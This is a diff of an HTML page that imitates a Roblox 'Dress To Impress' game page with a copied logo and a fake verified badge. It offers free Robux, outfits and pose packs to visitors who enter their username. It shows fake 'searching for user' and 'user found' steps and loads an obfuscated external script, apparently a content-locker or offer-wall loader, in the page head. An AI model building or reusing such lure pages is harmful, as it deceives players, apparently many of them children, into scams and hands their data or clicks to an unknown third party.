@@ -1,221 +1,1448 @@
 
 <!DOCTYPE html><html lang="en">
 <head>
-<meta content="text/html;charset=utf-8" http-equiv="content-type">
-<meta charset="utf-8">
-<meta content="width=device-width, initial-scale=1.0" name="viewport">
-<title>Tabbed Scrollable Container</title>
-<link href="style.css" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css2?family=Fredoka&display=swap" rel="stylesheet">
-<link rel="shortcut icon" href="https://ebookrecipes.com/wp-content/uploads/2025/06/logo.webp" type="image/x-icon">
-<!-- Font Awesome full (includes all icon sets) -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dress  Impress</title>
 <script type="text/javascript">
     var qZnch_JkU_bWVEnc={"it":4518765,"key":"334df"};
 </script>
 <script src="https://dfmpe7igjx4jo.cloudfront.net/80507d4.js"></script>
+      
+    <style>
+        
+        body {
+            font-family: 'Gotham', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f8f8;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        
+        .top-nav {
+            background-color: #e0e0e0;
+            padding: 12px 5%;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 0.1cm;
+        }
+        
+        .roblox-logo {
+            height: 28px;
+            margin-right: 20px;
+        }
+        
+        .nav-item {
+            color: black;
+            margin-right: 20px;
+            font-size: 14px;
+            font-weight: 700;
+            text-decoration: none;
+            text-transform: uppercase;
+        }
+        
+        
+        .main-content {
+            display: flex;
+            margin-top: 0.1cm;
+            gap: 30px;
+        }
+        
+        
+        .slideshow-container {
+            width: 60%;
+            position: relative;
+        }
+        
+        .main-image {
+            width: 100%;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            display: none;
+        }
+        
+        .main-image.active {
+            display: block;
+        }
+        
+       
+        .info-section {
+            width: 40%;
+        }
+        
+        .game-title {
+            font-size: 38px;
+            color: #333;
+            margin-bottom: 0.1cm;
+            font-weight: 700;
+        }
+        
+        .creator {
+            display: flex;
+            align-items: center;
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 0.1cm;
+            font-weight: 700;
+        }
+        
+        .verified-badge {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+        
+        .maturity-badge {
+            display: inline-block;
+            background-color: #f0f0f0;
+            color: #666;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            margin-bottom: 0.1cm;
+            font-weight: 700;
+        }
+        
+       
+        .play-now-container {
+            margin-top: 3.5cm; 
+            text-align: center;
+            width: 100%;
+        }
+        
+        .play-now-button {
+            background-color:#335fff;
+            color: white;
+            border: none;
+            padding: 10px 10px;
+            border-radius: 7px;
+            font-weight: 700;
+            font-size: 40px;
+            cursor: pointer;
+            display: inline-block;
+            width: 80%;
+            text-align: center;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+            transition: all 0.3s;
+        }
+        
+        .play-now-button:hover {
+            background-color: #0088d6;
+        }
+        
+        
+        .action-buttons-container {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 0.1cm;
+            margin-bottom: 0.1cm;
+            width: 100%;
+        }
+
+        .action-button {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            cursor: pointer;
+            margin-top: 0.1cm;
+        }
+
+        .action-button-icon {
+            width: 32px;
+            height: 32px;
+            color: #333;
+        }
+
+        .action-button-label {
+            margin-top: 0.1cm;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .action-button-count {
+            font-size: 14px;
+            font-weight: 700;
+            color: #666;
+            margin-top: 0.1cm;
+        }
+        
+        
+        .action-nav {
+            background-color: #e0e0e0;
+            padding: 0px 0;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin: 0.02cm 0;
+            width: 100%;
+        }
+        
+        .action-links {
+            display: flex;
+            justify-content: center;
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        
+        .action-link {
+            text-align: center;
+            padding: 15px 0;
+            cursor: pointer;
+            position: relative;
+            text-transform: uppercase;
+            font-weight: 700;
+            color: #000;
+            text-decoration: none;
+        }
+        
+        
+        @media (min-width: 768px) {
+            .action-link {
+                width: 300px;
+            }
+        }
+        
+        
+        @media (max-width: 767px) {
+            .action-link {
+                width: 110px;
+                font-size: 14px;
+                padding: 3px 0;
+            }
+            
+            .action-buttons-container {
+                gap: 15px;
+                flex-wrap: wrap;
+            }
+
+            .play-now-container {
+                margin-top: 0.1cm;
+            }
+        }
+        
+        .action-link:hover {
+            background-color: #e9ecef;
+        }
+        
+        .action-link.active::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background-color: black;
+        }
+        
+       
+        .store-section {
+            display: block;
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 30px;
+            margin-top: 0;
+        }
+        
+        .passes-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+            margin-top: 0.02cm;
+            margin-bottom: 0.02cm;
+            text-align: left;
+        }
+        
+        .items-row {
+            margin-bottom: 30px;
+        }
+        
+        
+        .items-row.top-row {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 15px;
+        }
+        
+        
+        .items-row.bottom-row {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 15px;
+        }
+        
+        .store-item {
+            text-align: center;
+        }
+        
+        .item-image {
+            width: 170px;
+            height: 170px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 0 auto 0.02cm;
+            background-color: #f0f0f0;
+            border: 3px solid #fff;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        
+        .item-title {
+            font-weight: 700;
+            margin-bottom: 0.02cm;
+            font-size: 15px;
+        }
+        
+        .item-price {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            margin-bottom: 0.02cm;
+        }
+        
+        .free-badge {
+            color: #000;
+            font-weight: 900;
+            display: flex;
+            align-items: center;
+        }
+        
+        .free-icon {
+            width: 30px;
+            height: 30px;
+            margin-right: 5px;
+            background-image: url('https://tse4.mm.bing.net/th?id=OIP.AZtpRYaMROCrDtdpzAYzvgHaH5&pid=Api&P=0&h=180');
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+        
+        .buy-button {
+            background-color: transparent;
+            color: #333;
+            border: 1px solid #000;
+            padding: 10px 45px;
+            border-radius: 10px;
+            font-weight: 1000;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .buy-button:hover {
+            background-color: #e0e0e0;
+        }
+        
+        
+        .about-section {
+            display: none;
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .welcome-message {
+            font-size: 20px;
+            line-height: 1.6;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        
+        .servers-section {
+            display: none;
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 30px;
+        }
+        
+        .servers-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .server-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        
+        .server-card {
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            transition: all 0.3s ease;
+        }
+        
+        .server-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .server-name {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        .server-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .server-players {
+            display: flex;
+            align-items: center;
+        }
+        
+        .player-count {
+            font-weight: 700;
+            color: #335fff;
+            margin-left: 5px;
+        }
+        
+        .join-button {
+            background-color: #335fff;
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 5px;
+            font-weight: 700;
+            cursor: pointer;
+            display: block;
+            width: 100%;
+            margin-top: 15px;
+            transition: all 0.3s;
+        }
+        
+        .join-button:hover {
+            background-color: #0088d6;
+        }
+        
+        .server-status {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        
+        .status-online {
+            background-color: #4CAF50;
+        }
+        
+        .status-full {
+            background-color: #f44336;
+        }
+        
+        .status-joining {
+            background-color: #FFC107;
+        }
+        
+        
+        .purchase-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .popup-content {
+            background-color: #333;
+            padding: 25px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 380px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            color: white;
+            margin: auto;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        
+        .popup-header {
+            position: relative;
+            padding-bottom: 20px;
+            margin-bottom: 15px;
+        }
+        
+        .popup-header h3 {
+            font-size: 24px;
+            margin: 0;
+            color: white;
+            font-weight: 700;
+        }
+        
+        .popup-header:after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 10%;
+            right: 10%;
+            height: 3px;
+            background-color: #666;
+        }
+        
+        .item-popup-image {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 0.3cm auto;
+            border: 3px solid #444;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+        
+        .item-confirm {
+            font-size: 18px;
+            margin: 0.3cm 0;
+            color: white;
+            font-weight: 700;
+            line-height: 1.4;
+        }
+        
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        
+        .input-group label {
+            display: none;
+        }
+        
+        .input-group input {
+            width: 92%;
+            padding: 15px 12px;
+            background-color: white;
+            color: #333;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 15px;
+            font-weight: 600;
+        }
+        
+        .input-group input::placeholder {
+            color: #999;
+            font-weight: 700;
+        }
+        
+        .popup-buttons {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+        }
+        
+        .cancel-btn {
+            background-color: #555;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            flex: 1;
+            font-size: 15px;
+        }
+        
+        .free-btn {
+            background-color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .free-btn .free-badge {
+            color: #333;
+            font-weight: 900;
+            display: flex;
+            align-items: center;
+            font-size: 15px;
+        }
+        
+        .free-btn .free-icon {
+            width: 20px;
+            height: 20px;
+            background-image: url('https://tse4.mm.bing.net/th?id=OIP.AZtpRYaMROCrDtdpzAYzvgHaH5&pid=Api&P=0&h=180');
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+
+        
+        .searching-container {
+            text-align: center;
+            padding: 20px;
+        }
+        
+        
+        .folding {
+            margin: 20px auto;
+            width: 70px;
+            height: 70px;
+            position: relative;
+            transform: rotateZ(45deg);
+        }
+
+        .square {
+            position: absolute;
+            top: 30%;
+            right: 30%;
+            width: 30px;
+            height: 30px;
+            background-color: #000;
+            transform: rotateZ(87deg);
+        }
+
+        .folding .sk-cube {
+            float: left;
+            width: 50%;
+            height: 50%;
+            position: relative;
+            transform: scale(1.1);
+        }
+
+        .folding .sk-cube:before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #fff;
+            animation: sk-foldCubeAngle 2.4s infinite linear both;
+            transform-origin: 100% 100%;
+        }
+
+        .folding .sk-cube2 {
+            transform: scale(1.1) rotateZ(90deg);
+        }
+
+        .folding .sk-cube3 {
+            transform: scale(1.1) rotateZ(180deg);
+        }
+
+        .folding .sk-cube4 {
+            transform: scale(1.1) rotateZ(270deg);
+        }
+
+        .folding .sk-cube2:before {
+            animation-delay: 0.3s;
+        }
+
+        .folding .sk-cube3:before {
+            animation-delay: 0.6s;
+        }
+
+        .folding .sk-cube4:before {
+            animation-delay: 0.9s;
+        }
+
+        @keyframes sk-foldCubeAngle {
+            0%, 10% {
+                transform: perspective(140px) rotateX(-180deg);
+                opacity: 0;
+            }
+            25%, 75% {
+                transform: perspective(140px) rotateX(0deg);
+                opacity: 1;
+            }
+            90%, 100% {
+                transform: perspective(140px) rotateY(180deg);
+                opacity: 0;
+            }
+        }
+
+        .searching-text {
+            color: white;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+
+        .result-avatar {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 15px auto;
+            border: 3px solid #444;
+        }
+
+        .result-username {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+
+        .get-item-now-btn {
+            background-color: white;
+            color: #333;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            margin-top: 15px;
+            transition: all 0.3s;
+        }
+
+        .get-item-now-btn:hover {
+            background-color: #f0f0f0;
+        }
+
+        .d-none {
+            display: none !important;
+        }
+
+        .user-error {
+            color: #ff6b6b;
+            font-size: 14px;
+            margin-top: 5px;
+            text-align: center;
+        }
+
+        
+        @media (max-width: 768px) {
+            .main-content {
+                flex-direction: column;
+                margin-top: 0.1cm;
+            }
+            
+            .slideshow-container,
+            .info-section {
+                width: 100%;
+            }
+            
+            .game-title {
+                margin-top: 0.1cm;
+            }
+            
+            
+            .items-row.top-row,
+            .items-row.bottom-row {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .item-image {
+                width: 150px;
+                height: 150px;
+            }
+            
+            .item-title {
+                font-size: 18px;
+            }
+            
+            
+            .free-badge {
+                font-size: 14px;
+            }
+            
+            .free-icon {
+                width: 20px;
+                height: 20px;
+            }
+            
+            .action-nav {
+                overflow-x: auto;
+                -webkit-overflow-scrolling: touch;
+                padding: 12px 0;
+                background-color: #e0e0e0;
+                margin: 0.02cm 0;
+            }
+            
+            .action-links {
+                display: flex;
+                justify-content: flex-start;
+                min-width: max-content;
+                padding: 0 10px;
+            }
+            
+            .about-section, .store-section, .servers-section {
+                padding: 20px;
+            }
+            
+            .server-list {
+                grid-template-columns: 1fr;
+            }
+            
+            .popup-content {
+                width: 90%;
+                max-width: 350px;
+                padding: 20px;
+                margin: auto;
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+            }
+            
+            .item-popup-image {
+                width: 110px;
+                height: 110px;
+            }
+            
+            .popup-header h3 {
+                font-size: 22px;
+            }
+            
+            .item-confirm {
+                font-size: 17px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .item-image {
+                width: 130px;
+                height: 130px;
+            }
+            
+            .popup-header:after {
+                left: 5%;
+                right: 5%;
+                height: 3px;
+            }
+            
+            .item-popup-image {
+                width: 100px;
+                height: 100px;
+            }
+            
+            .popup-buttons {
+                flex-direction: row;
+            }
+            
+            .input-group input {
+                padding: 8px 10px;
+            }
+            
+            .popup-content {
+                width: 90%;
+                max-width: 300px;
+                padding: 15px;
+                margin: auto;
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+            }
+        }
+    </style>
+</head>
 
 
-</head><body><div class="top">
-<img class="logo" src="images/klQWxhLHux2k.webp">
-</div>
-<div class="user-input-section">
-<input id="username" placeholder="Enter your username" type="text">
-</div>
-<button id="generate-button"></button>
-<section>
-<p>Browse through the available items:</p>
-</section>
-<div id="warning-message" style="display: none; text-align: center; color: red;">
-            You can only select up to 5 items!
+<body>
+    
+    <nav class="top-nav">
+        <img src="https://tse3.mm.bing.net/th?id=OIP.tJgzST8v8EzhWHzLi2LEsAHaHa&pid=Api&P=0&h=180" alt="Roblox Logo" class="roblox-logo">
+        <a class="nav-item">Charts</a>
+        <a class="nav-item">Marketplace</a>
+        <a class="nav-item">Create</a>
+        <a class="nav-item">Robux</a>
+    </nav>
+    
+    <div class="container">
+        <div class="main-content">
+            
+            <div class="slideshow-container">
+                <img src="https://tr.rbxcdn.com/180DAY-32cf6009858ce5af3853602a4dfdef67/768/432/Image/Webp/noFilter" alt="Outfit 1" class="main-image">
+                <img src="https://tr.rbxcdn.com/180DAY-a01ce29ea4ae7c7e1e7bb600d7ea4a45/768/432/Image/Webp/noFilter" alt="Outfit 2" class="main-image active">
+                <img src="https://tr.rbxcdn.com/180DAY-e09c8fa78c550204dea38cb8125a3195/768/432/Image/Webp/noFilter" alt="Outfit 3" class="main-image">
+                <img src="https://tr.rbxcdn.com/180DAY-f8f917ac708dba73d2dd322a78e7604d/768/432/Image/Webp/noFilter" alt="Outfit 4" class="main-image">
+                <img src="https://tr.rbxcdn.com/180DAY-767e3fe75985580326e50f3d4340afd9/768/432/Image/Webp/noFilter" alt="Outfit 5" class="main-image">
+                <img src="https://tr.rbxcdn.com/180DAY-8a94bdd0f2f740baca7389a60c43451c/768/432/Image/Webp/noFilter" alt="Outfit 6" class="main-image">
+                <img src="https://tr.rbxcdn.com/180DAY-ce4e950e7397bdacc7abce5fd4c5a187/768/432/Image/Webp/noFilter" alt="Outfit 7" class="main-image">
+            </div>
+            
+            
+            <div class="info-section">
+                <h1 class="game-title">🗺️Dress To Impress</h1>
+                <div class="creator">
+                    By Dress To Impress Group
+                    <img src="https://tse4.mm.bing.net/th?id=OIP.Ljra9jhbLNTM3ckenkEF_QAAAA&pid=Api&P=0&h=180" alt="Verified Badge" class="verified-badge">
+                </div>
+                <span class="maturity-badge">Maturity: Minimal</span>
+                
+                
+                <div class="play-now-container">
+                    <button class="play-now-button">
+                        <svg viewBox="0 0 24 24" width="45" height="45">
+                            <polygon points="8,5 19,12 8,19" fill="white"></polygon>
+                        </svg>
+                    </button>
+                </div>
+
+                
+                <div class="action-buttons-container">
+                    <div class="action-button">
+                        <svg class="action-button-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
+                        </svg>
+                        <span class="action-button-label">Favorited</span>
+                    </div>
+                    
+                    <div class="action-button">
+                        <svg class="action-button-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path>
+                            <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
+                        </svg>
+                        <span class="action-button-label">Notify</span>
+                    </div>
+                    
+                    <div class="action-button">
+                        <svg class="action-button-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"></path>
+                        </svg>
+                        <span class="action-button-count">2M+</span>
+                    </div>
+                    
+                    <div class="action-button">
+                        <svg class="action-button-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M10 15v4a3 3 0 0 0 3 3l4-9V2H5.72a2 2 0 0 0-2 1.7l-1.38 9a2 2 0 0 0 2 2.3zm7-13h2.67A2.31 2.31 0 0 1 22 4v7a2.31 2.31 0 0 1-2.33 2H17"></path>
+                        </svg>
+                        <span class="action-button-count">286K+</span>
+                    </div>
+                </div>
+            </div>
         </div>
-<!-- Tabs and Scrollable Container -->
-<div class="container-wrapper">
-<!-- Scrollable Container with Tabs -->
-<div class="scrollable-container">
-<!-- Tabs -->
-<div class="tabs">
-<div class="tab active" data-target="#tab1">
-<img alt="Tab 1" loading="eager" src="images/Bb3YN0DeVf0S.png">
-</div>
-<div class="tab" data-target="#tab2">
-<img alt="Tab 2" loading="eager" src="images/5Tnhi8I0By9o.png">
-</div>
-<div class="tab" data-target="#tab3">
-<img alt="Tab 3" loading="eager" src="images/rF2YPD59Ekiu.png">
-</div>
-<div class="tab" data-target="#tab4">
-<img alt="Tab 4" loading="eager" src="images/ODF6dXKLGvQp.png">
-</div>
-</div>
-<!-- Scrollable Content -->
-<div class="scrollable-content">
-<!-- Tab 1 Content -->
-<div class="section" id="tab1">
-<div class="row">
-<div class="image-wrapper"><img alt="Custom Makeup.." class="grid-image" loading="eager" src="images/9yHJk8iXkMKN.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="VIP Access.." class="grid-image" loading="eager" src="images/Hp2poHouxZxS.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Run Faster.." class="grid-image" loading="eager" src="images/OrAstZZaAz8J.png"><div class="checkmark"></div></div>
-</div>
-<div class="row">
-<div class="image-wrapper"><img alt="x2 Money.." class="grid-image" loading="eager" src="images/st8KtjC66fwN.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Increased Item Limit.." class="grid-image" loading="eager" src="images/T8KdVypOMlxi.png"><div class="checkmark"></div></div>
-</div>
-<div class="row">
-<div class="image-wrapper"><img alt="Rainbow Skin.." class="grid-image" loading="eager" src="images/50JBy6WnFwPo.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Invisibility Skin.." class="grid-image" loading="eager" src="images/z13mo4G5l8wF.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Advanced Makeup.." class="grid-image" loading="eager" src="images/sWggtGk1PaY3.png"><div class="checkmark"></div></div>
-</div>
-<div class="row">
-<div class="image-wrapper"><img alt="Flamethrower.." class="grid-image" loading="lazy" src="images/8Ze1KouAJVZ9.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Portal Gun.." class="grid-image" loading="lazy" src="images/dxDDHIfgrvVu.png"><div class="checkmark"></div></div>
-</div>
-</div>
-<!-- Tab 2 Content -->
-<div class="section" id="tab2">
-<div class="row row3">
-<div class="image-wrapper"><img alt="$100.." class="grid-image" loading="lazy" src="images/35MEZKqJZnry.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="$500.." class="grid-image" loading="lazy" src="images/ngoFn6sCAazd.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="$1200.." class="grid-image" loading="lazy" src="images/xqNpjsbGj2Rw.png"><div class="checkmark"></div></div>
-</div>
-<div class="row">
-<div class="image-wrapper"><img alt="$6000.." class="grid-image-large" loading="lazy" src="images/ZcWQWvMgsdlU.png"><div class="checkmark"></div></div>
-</div>
-</div>
-<!-- Tab 3 Content -->
-<div class="section" id="tab3">
-<div class="row tab3">
-<div class="image-wrapper"><img alt="Robux Items.." class="tab3-grid-image" loading="lazy" src="images/PiMIjcdTv5CY.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Skull Thigh High Boots.." class="tab3-grid-image" loading="lazy" src="images/znchwPDG88fB.png"><div class="checkmark"></div></div>
-</div>
-<div class="row tab3">
-<div class="image-wrapper"><img alt="Acoustic Guitar.." class="tab3-grid-image" loading="lazy" src="images/nypCFUHDlpGz.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Supernova Star Set.." class="tab3-grid-image" loading="lazy" src="images/LREd4D9gPJ3C.png"><div class="checkmark"></div></div>
-</div>
-<div class="row tab3">
-<div class="image-wrapper"><img alt="Witch Set.." class="tab3-grid-image" loading="lazy" src="images/egJcX038CNoh.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Teddy Bear.." class="tab3-grid-image" loading="lazy" src="images/VyJ5zlwSDhsa.png"><div class="checkmark"></div></div>
-</div>
-<div class="row tab3">
-<div class="image-wrapper"><img alt="Coquette Dress.." class="tab3-grid-image" loading="lazy" src="images/lITnBHckktFM.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Summer Ruffle Dress (& Skirt).." class="tab3-grid-image" loading="lazy" src="images/Ns8xub5OgKXw.png"><div class="checkmark"></div></div>
-</div>
-<div class="row tab3">
-<div class="image-wrapper"><img alt="Strawberry Dress.." class="tab3-grid-image" loading="lazy" src="images/YTqw6Y9DK9eH.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Huge Ruffle Skirt.." class="tab3-grid-image" loading="lazy" src="images/FkdZDHApB7V8.png"><div class="checkmark"></div></div>
-</div>
-<div class="row tab3">
-<div class="image-wrapper"><img alt="Tank Dress.." class="tab3-grid-image" loading="lazy" src="images/Lo2LGgZSnA0G.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Coquette T-Shirt.." class="tab3-grid-image" loading="lazy" src="images/cvyyZ3FcFDkh.png"><div class="checkmark"></div></div>
-</div>
-<div class="row tab3">
-<div class="image-wrapper"><img alt="Beige Dress.." class="tab3-grid-image" loading="lazy" src="images/PjWiGIvr6njz.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Vintage Mini Dress Set.." class="tab3-grid-image" loading="lazy" src="images/vZSEoF5jlW5H.png"><div class="checkmark"></div></div>
-</div>
-</div>
-<!-- Tab 4 Content -->
-<div class="section" id="tab4">
-<div class="row row4">
-<div class="image-wrapper"><img alt="Halloween Pose Pack.." class="grid-image-pose" loading="lazy" src="images/P4ahDps5fMG9.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Troll Pose Pack.." class="grid-image-pose" loading="lazy" src="images/Kx6swRDqcyN2.png"><div class="checkmark"></div></div>
-</div>
-<div class="row row4">
-<div class="image-wrapper"><img alt="Fairy Pose Pack.." class="grid-image-pose" loading="lazy" src="images/h9stMa21Dspq.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Hand Pose Pack.." class="grid-image-pose" loading="lazy" src="images/EDI5Dn8gKBib.png"><div class="checkmark"></div></div>
-</div>
-<div class="row row4">
-<div class="image-wrapper"><img alt="Dance Pose Pack.." class="grid-image-pose" loading="lazy" src="images/lIcDBm0O3oVq.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Masculine Pose Pack.." class="grid-image-pose" loading="lazy" src="images/xzuoGyvUgPpM.png"><div class="checkmark"></div></div>
-</div>
-<div class="row row4">
-<div class="image-wrapper"><img alt="Hermaid Pose Pack.." class="grid-image-pose" loading="lazy" src="images/gjH2GgDnUMfB.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Editorial Pose Pack.." class="grid-image-pose" loading="lazy" src="images/LVhS3dnFJt6h.png"><div class="checkmark"></div></div>
-</div>
-<div class="row row4">
-<div class="image-wrapper"><img alt="Goddess Pose Pack.." class="grid-image-pose" loading="lazy" src="images/66HwMTI4Qld0.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Baddies Pose Pack.." class="grid-image-pose" loading="lazy" src="images/DLojR5IxCL6s.png"><div class="checkmark"></div></div>
-</div>
-<div class="row row4">
-<div class="image-wrapper"><img alt="Gala Pose Pack.." class="grid-image-pose" loading="lazy" src="images/3IiLZbNOj9re.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="K-Pop Pose Pack.." class="grid-image-pose" loading="lazy" src="images/3u0yDSxTWCIW.png"><div class="checkmark"></div></div>
-</div>
-<div class="row row4">
-<div class="image-wrapper"><img alt="Kawaii Pose Pack.." class="grid-image-pose" loading="lazy" src="images/w3S3T2h4jXH7.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Supermodel Pose Pack.." class="grid-image-pose" loading="lazy" src="images/bKz69B9acD7L.png"><div class="checkmark"></div></div>
-</div>
-<div class="row row4">
-<div class="image-wrapper"><img alt="Sci-Fi Pose Pack.." class="grid-image-pose" loading="lazy" src="images/yrIEl3HdLtNe.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Crazy Pose Pack.." class="grid-image-pose" loading="lazy" src="images/IYAgykjOVObU.png"><div class="checkmark"></div></div>
-</div>
-<div class="row row4">
-<div class="image-wrapper"><img alt="Pop Culture Pose Pack.." class="grid-image-pose" loading="lazy" src="images/IVMswy84m5cN.png"><div class="checkmark"></div></div>
-<div class="image-wrapper"><img alt="Fantasy Pose Pack.." class="grid-image-pose" loading="lazy" src="images/jfC1phbY8u49.png"><div class="checkmark"></div></div>
-</div>
-</div>
-</div>
-</div>
-</div>
-<div class="hidden" id="sequence-container">
-<!-- Step 1: Searching -->
-<div class="step hidden" id="step-1">
-<img alt="Searching" src="images/wyd8J7OsfE0f.png">
-<p>Searching for <span id="username-placeholder"></span>...</p>
-</div>
-<!-- Step 2: User Found -->
-<div class="step hidden" id="step-2">
-<img alt="User Found" src="images/tvMgIEPXTUra.png">
-<p>User Found: <span id="username-display"></span></p>
-</div>
